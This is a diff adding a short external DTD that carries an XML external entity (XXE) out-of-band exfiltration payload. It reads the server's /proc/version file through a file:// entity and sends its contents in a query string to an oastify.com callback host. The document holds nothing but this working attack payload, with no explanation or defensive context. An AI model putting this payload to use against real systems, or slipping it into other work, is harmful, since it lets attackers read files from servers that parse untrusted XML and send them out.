@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///proc/version">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://w63ewr9jkq4mxp4ha7ozl9p8jzprdh16.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
